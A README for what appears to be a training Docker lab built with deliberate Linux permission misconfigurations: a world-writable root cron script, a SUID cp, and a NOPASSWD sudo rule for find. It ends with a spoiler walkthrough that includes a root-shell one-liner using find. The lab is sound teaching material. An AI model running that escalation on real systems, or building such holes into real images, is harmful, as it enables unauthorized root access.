# perm-lab

Headless Docker lab for practicing Linux file permission and privilege escalation techniques, from an offensive security perspective.

## Getting Started (Clone Instructions)

Before cloning, create a dedicated folder and move into it:

```bash
mkdir ~/perm-lab && cd ~/perm-lab
git clone https://github.com/learnwithworkshop/perm-lab.git .
```

The trailing `.` clones the repo's contents directly into `~/perm-lab` instead of creating a nested `perm-lab/perm-lab` folder.

## What this is

A deliberately misconfigured Debian-based container. You start as a low-privilege user and the goal is to escalate to `root` by exploiting common real-world misconfigurations.

## Build

```bash
docker build -t perm-lab .
```

## Run

```bash
docker run -it --rm --hostname container perm-lab
```

You'll land inside the container as the `lowpriv` user.

## Misconfigurations included

| # | Misconfig | Where |
|---|-----------|-------|
| 1 | World-writable script | `/usr/local/bin/rootcron.sh` (chmod 777) |
| 2 | SUID binary | `/usr/local/bin/vulncp` (SUID copy of `cp`) |
| 3 | Weak sudoers entry | `lowpriv` can run `/usr/bin/find` as root, NOPASSWD |
| 4 | World-writable config | `/etc/custom.conf` (chmod 666) |

## Goal

Read the root-only flag at `/root/secrets/flag.txt`.

## Walkthrough (spoiler)

1. Enumerate SUID binaries:
```bash
   find / -perm -4000 2>/dev/null
```
2. Check sudo permissions:
```bash
   sudo -l
```
3. Exploit the `find` NOPASSWD entry (GTFOBins-style privilege escalation):
```bash
   sudo find . -exec /bin/bash \; -quit
```
4. Read the flag:
```bash
   cat /root/secrets/flag.txt
```

## Disclaimer

This image is intentionally vulnerable. Only run it in an isolated environment (Docker container). Do not deploy it on a production or internet-facing system.
